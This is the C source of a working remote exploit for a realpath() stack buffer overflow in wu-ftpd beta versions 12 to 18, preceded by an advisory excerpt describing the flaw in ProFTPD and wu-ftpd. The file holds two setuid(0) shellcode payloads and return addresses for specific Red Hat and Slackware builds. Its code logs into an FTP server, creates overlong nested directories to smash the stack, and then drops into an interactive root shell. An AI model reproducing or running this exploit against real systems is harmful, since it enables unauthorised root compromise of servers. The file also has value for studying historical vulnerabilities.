/*
source: http://www.securityfocus.com/bid/113/info

There is a vulnerability in ProFTPD versions 1.2.0pre1 and earlier and in wu-ftpd 2.4.2 (beta 18) VR9 and earlier. This vulnerability is a buffer overflow triggered by unusually long path names (directory structures). For example, if a user has write privilages he or she may create an unusually long pathname which due to insuficient bounds checking in ProFTPD will overwrite the stack. This will allow the attacker to insert their own instruction set on the stack to be excuted thereby elavating their access.

The problem is in a bad implementation of the "realpath" function.
*/

/*
 * Remote/local exploit for wu-ftpd [12] through [18]
 * gcc w00f.c -o w00f -Wall -O2
 *
 * Offsets/padding may need to be changed, depending on remote daemon
 * compilation options. Try offsets -5000 to 5000 in increments of 100.
 *
 * Note: you need to use -t >0 for -any- version lower than 18.
 * Coded by smiler and cossack
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdarg.h>
#include <unistd.h>
#include <errno.h>
#include <sys/socket.h>
#include <sys/time.h>
#include <netinet/in.h>
#include <netdb.h>
#include <arpa/inet.h>


/* In a beta[12-17] shellcode_A overflow, we will not see responses
to our commands. Add option -c (use chroot code) to fix this. */
unsigned char hellcode_a[]=
        "\x31\xdb\x89\xd8\xb0\x17\xcd\x80" /* setuid(0) */
        "\xeb\x2c\x5b\x89\xd9\x80\xc1\x06\x39\xd9\x7c\x07\x80\x01\x20"
        "\xfe\xc9\xeb\xf5\x89\x5b\x08\x31\xc0\x88\x43\x07\x89\x43\x0c"
        "\xb0\x0b\x8d\x4b\x08\x8d\x53\x0c\xcd\x80\x31\xc0\xfe\xc0\xcd"
        "\x80\xe8\xcf\xff\xff\xff\xff\xff\xff"
        "\x0f\x42\x49\x4e\x0f\x53\x48";

unsigned char hellcode_b[]=
        "\x31\xdb\x89\xd8\xb0\x17\xcd\x80" /* setuid(0) */
        "\xeb\x66\x5e\x89\xf3\x80\xc3\x0f\x39\xf3\x7c\x07\x80"
        "\x2b\x02\xfe\xcb\xeb\xf5\x31\xc0\x88\x46\x01\x88\x46"
        "\x08\x88\x46\x10\x8d\x5e\x07\xb0\x0c\xcd\x80\x8d\x1e"
        "\x31\xc9\xb0\x27\xcd\x80\x31\xc0\xb0\x3d\xcd\x80\x31"
        "\xc0\x8d\x5e\x02\xb0\x0c\xcd\x80\x31\xc0\x88\x46\x03"
        "\x8d\x5e\x02\xb0\x3d\xcd\x80\x89\xf3\x80\xc3\x09\x89"
        "\x5b\x08\x31\xc0\x88\x43\x07\x89\x43\x0c\xb0\x0b\x8d"
        "\x4b\x08\x8d\x53\x0c\xcd\x80\x31\xc0\xfe\xc0\xcd\x80"
        "\xe8\x95\xff\xff\xff\xff\xff\xff\x43\x43\x30\x30\x31"
        "\x30\x30\x31\x43\x31\x64\x6b\x70\x31\x75\x6a";
 

char *Fgets(char *s,int size,FILE *stream);
int ftp_command(char *buf,int success,FILE *out,char *fmt,...);
int double_up(unsigned long blah,char *doh);
int resolv(char *hostname,struct in_addr *addr);
void fatal(char *string);
int usage(char *program);
int tcp_connect(struct in_addr host,unsigned short port);
int parse_pwd(char *in,int *pwdlen);
void RunShell(int thesock);



struct type {
        unsigned long ret_address;
        unsigned char align; /* Use this only to offset \xff's used */
        signed short pad_shift; /* how little/much padding */
        unsigned char overflow_type; /* whether you have to DELE */
        char *name;
};

/* ret_pos is the same for all types of overflows, you only have to change
   the padding. This makes it neater, and gives the shellcode plenty of
   room for nops etc
 */
#define RET_POS 190 
#define FTPROOT "/home/ftp"


/* the redhat 5.0 exploit doesn't work at the moment...it must be some
   trite error i am overlooking. (the shellcode exits w/ code 0375) */
struct type types[]={
        { 0xbffff340, 3, 60, 0,  "BETA-18 (redhat 5.2)", },   
        { 0xbfffe30e, 3,-28, 1,  "BETA-16 (redhat 5.1)", },   
        { 0xb2ffe356, 3,-28, 1,  "BETA-15 (redhat 5.0)", },   
        { 0xbfffebc5, 3,  0, 1,  "BETA-15 (slackware 3.3)", },
        { 0xbffff3b3, 3,  0, 1,  "BETA-15 (slackware 3.4)", },
        { 0xbffff395, 3,  0, 1,  "BETA-15 (slackware 3.6)", },
        { 0,0,0,0,NULL }
                    };
 
struct options {
        char start_dir[20];
        unsigned char *shellcode;
        unsigned char chroot;
        char username[10];
        char password[10];
        int offset;
        int t;
} opts;

/* Bit of a big messy function, but hey, its only an exploit */

int main(int argc,char **argv)
{
        char *argv0,ltr;
        char outbuf[1024], inbuf[1024], ret_string[5];
        int pwdlen,ctr,d;
        FILE *cin;
        int fd;
        struct in_addr victim;

        argv0 = strdup(argv[0]);
        *opts.username = *opts.password = *opts.start_dir = 0;
        opts.chroot = opts.offset = opts.t = 0;
        opts.shellcode = hellcode_a;

        while ((d = getopt(argc,argv,"cs:o:t:"))!= -1){
                switch (d) {
                case 'c':
                        opts.shellcode = hellcode_b;
                        opts.chroot = 1;
                        break;
                case 's':
                        strcpy(opts.start_dir,optarg);
                        break;
                case 'o':
                        opts.offset = atoi(optarg);
                        break;
                case 't':
                        opts.t = atoi(optarg);
                        if ((opts.t < 0)||(opts.t>5)) {
                                printf("Dont have that type!\n");
                                exit(-1);
                        }
                }
        }
        
        argc -= optind;
        argv += optind;

        if (argc < 3)
                usage(argv0);

        if (!resolv(argv[0],&victim)) {
                perror("resolving");
                exit(-1);
        }
        strcpy(opts.username,argv[1]);
        strcpy(opts.password,argv[2]);
        
        if ((fd = tcp_connect(victim,21)) < 0) {
                perror("connect");
                exit(-1);
        }
        
        if (!(cin = fdopen(fd,"r"))) {
                printf("Couldn't get stream\n");
                exit(-1);
        }

        Fgets(inbuf,sizeof(inbuf),cin);
        printf("%s",inbuf);
                        
        if (ftp_command(inbuf,331,cin,"USER %s\n",opts.username)<0)
                fatal("Bad username\n");
        if (ftp_command(inbuf,230,cin,"PASS %s\n",opts.password)<0)
                fatal("Bad password\n");
                        
        if (*opts.start_dir)  
                if (ftp_command(inbuf,250,cin,"CWD %s\n",opts.start_dir)<0)
                        fatal("Couldn't change dir\n");
 
        if (ftp_command(inbuf,257,cin,"PWD\n")<0)
                fatal("PWD\n");

        if (parse_pwd(inbuf,&pwdlen) < 0)
                fatal("PWD\n");
        
        srand(time(NULL));
        printf("Making padding directorys\n");
        for (ctr = 0;ctr < 4;ctr++) {
                ltr = rand()%26 + 65;
                memset(outbuf,ltr,194);
                outbuf[194]=0;
                if (ftp_command(inbuf,257,cin,"MKD %s\n",outbuf)<0)
                        fatal("MKD\n");
                if (ftp_command(inbuf,250,cin,"CWD %s\n",outbuf)<0)
                        fatal("CWD\n");
        }

        /* Make padding directory */
        
        ctr = 124 - (pwdlen - types[opts.t].align);//180
        //ctr = 152 - (pwdlen - types[opts.t].align);
        ctr -= types[opts.t].pad_shift;
        if (ctr < 0) {
                exit(-1);
        }
        memset(outbuf,'A',ctr+1);
        outbuf[ctr] = 0;
        if (ftp_command(inbuf,257,cin,"MKD %s\n",outbuf)<0)
                fatal("MKD\n");
        if (ftp_command(inbuf,250,cin,"CWD %s\n",outbuf)<0)
                fatal("CWD\n");

        memset(outbuf,0x90,195);
        d=0;
        for (ctr = RET_POS-strlen(opts.shellcode);ctr<(RET_POS);ctr++)
                outbuf[ctr] = opts.shellcode[d++];
        double_up(types[opts.t].ret_address-opts.offset,ret_string);
        strcpy(outbuf+RET_POS,ret_string);
        strcpy(outbuf+RET_POS+strlen(ret_string),ret_string);
 
        printf("Press any key to send shellcode...\n");
        getchar();
        if (ftp_command(inbuf,257,cin,"MKD %s\n",outbuf)<0)
                fatal("MKD\n");
        if (types[opts.t].overflow_type == 1)
                if (ftp_command(inbuf,250,cin,"DELE %s\n",outbuf)<0)
                        fatal("DELE\n");
        /* HEH. For type 1 style we add a dele command. This overflow
        occurs in delete() in ftpd.c. The cause is realpath() in realpath.c
        not checking bounds correctly, overwriting path[] in delete(). */
                
        RunShell(fd);
        return(1);
}
                
void RunShell(int thesock)
{
        int n;
        char recvbuf[1024];
        fd_set rset;

        while (1)
        {
                FD_ZERO(&rset);
                FD_SET(thesock,&rset);
                FD_SET(STDIN_FILENO,&rset);
                select(thesock+1,&rset,NULL,NULL,NULL);
                if (FD_ISSET(thesock,&rset))
                {
                        n=read(thesock,recvbuf,1024);
                        if (n <= 0)
                        {
                                printf("Connection closed\n");
                                exit(0);
                        }
                        recvbuf[n]=0;
                        printf("%s",recvbuf);
                }
                if (FD_ISSET(STDIN_FILENO,&rset))
                {
                        n=read(STDIN_FILENO,recvbuf,1024);
                        if (n>0)
                        {
                                recvbuf[n]=0;
                                write(thesock,recvbuf,n);
                        }
                }
        }
        return;
}

                
int double_up(unsigned long blah, char *doh)
{
        int a;
        unsigned char *ptr,*ptr2;
        bzero(doh,6);
        ptr=doh;
        ptr2=(char *)&blah;
        for (a=0;a<4;a++) {
                *ptr++=*ptr2;
                if (*ptr2==0xff) *ptr++=0xff;
                ptr2++;
        }
        return(1);
}
                
                
int parse_pwd(char *in, int *pwdlen)
{
        char *ptr1,*ptr2;
                        
        /* 257 "/" is current directory */
        ptr1 = strchr(in,'\"');
        if (!ptr1) return(-1);
        ptr2 = strchr(ptr1+1,'\"');
        if (!ptr2) return(-1);
        *ptr2 = 0;
        *pwdlen = strlen(ptr1+1);
        /* If its just "/" then it contributes nothing to the RET_POS */
        if (*pwdlen==1) *pwdlen -= 1;
        printf("Home Dir = %s, Len = %d\n",ptr1+1,*pwdlen);
        return(1);
}
                                
int tcp_connect(struct in_addr host,unsigned short port) 
{
        struct sockaddr_in serv;
        int fd;
        
        fd = socket(AF_INET,SOCK_STREAM,IPPROTO_TCP);
        bzero(&serv,sizeof(serv));
        memcpy(&serv.sin_addr,&host,sizeof(struct in_addr));
        serv.sin_port = htons(port);
        serv.sin_family = AF_INET;
        if (connect(fd,(struct sockaddr *)&serv,sizeof(serv)) < 0) {
                return(-1);
        }
        return(fd);
}
        
                
int ftp_command(char *buf,int success,FILE *out,char *fmt,...)
{
        va_list va;
        char line[1200];
        int val;
                
        va_start(va,fmt);
        vsprintf(line,fmt,va);
        va_end(va);
        
        if (write(fileno(out),line,strlen(line)) < 0)
                return(-1);

        bzero(buf,200);
        while(1) {
                Fgets(line,sizeof(line),out);
#ifdef DEBUG
                printf("%s",line);
#endif
                if (*(line+3)!='-') break;
        }
        strncpy(buf,line,200);
        val = atoi(line);
        if (success != val) return(-1);
        return(1);
}
        
void fatal(char *string)
{       
        printf("%s",string);
        exit(-1);
}
        
char *Fgets(char *s,int size,FILE *stream)
{
        char *ptr;

        ptr = fgets(s,size,stream);
        //if (!ptr)
                //fatal("Disconnected\n");
        return(ptr);
}
 
int resolv(char *hostname,struct in_addr *addr)
{
        struct hostent *res;
                
        if (inet_aton(hostname,addr))
                return(1);
        
        res = gethostbyname(hostname);
        if (res == NULL)
                return(0);

        memcpy((char *)addr,(char *)res->h_addr,sizeof(struct in_addr));
        return(1);
}

int usage(char *program)
{
        fprintf(stderr,"Usage: %s <host> <username> <password> [-c] [-s start_dir]\n",program);
        fprintf(stderr,"\t[-o offset] [-t type]\n");
        fprintf(stderr,"types:\n");
        fprintf(stderr,"0 - %s\n", types[0].name);
        fprintf(stderr,"1 - %s\n", types[1].name);
        fprintf(stderr,"2 - %s\n", types[2].name);
        fprintf(stderr,"3 - %s\n", types[3].name);
        fprintf(stderr,"4 - %s\n", types[4].name);
        fprintf(stderr,"5 - %s\n", types[5].name);
        fprintf(stderr,"\n");
        exit(0);
}
        
/* -EOF- */